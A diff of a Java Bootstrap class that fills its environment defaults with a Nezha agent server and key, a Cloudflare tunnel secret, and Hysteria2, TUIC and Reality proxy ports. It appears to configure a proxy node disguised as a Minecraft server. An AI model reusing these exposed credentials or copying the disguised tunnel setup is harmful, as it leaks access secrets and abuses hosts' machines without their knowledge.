@@ -94,23 +94,23 @@ public class Bootstrap
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        envVars.put("UUID", "3afd5f46-9cb3-4dc9-8e3a-cb4add6f68af");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_SERVER", "nz.0668.pp.ua:443");
         envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "");
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "");
+        envVars.put("NEZHA_KEY", "nII2khh98vtJ35UxRfyWlHsxELYGtnnc");
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "apexnodes.wto.pp.ua");
+        envVars.put("ARGO_AUTH", "{"AccountTag":"c77cee9ebdf07199dbb8afda46c46e83","TunnelSecret":"YFwD5qUAr/zwKVM8fM8ASoJoD/npINlZKS5M6OeP9l4=","TunnelID":"3e98f69d-9f94-47f3-899a-5995f9a4e51e","Endpoint":""}");
+        envVars.put("HY2_PORT", "49508");
+        envVars.put("TUIC_PORT", "41802");
+        envVars.put("REALITY_PORT", "50000");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
-        envVars.put("CFIP", "");
-        envVars.put("CFPORT", "");
-        envVars.put("NAME", "Mc");
+        envVars.put("CFIP", "www.visa.com.sg");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "Apexnodes");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
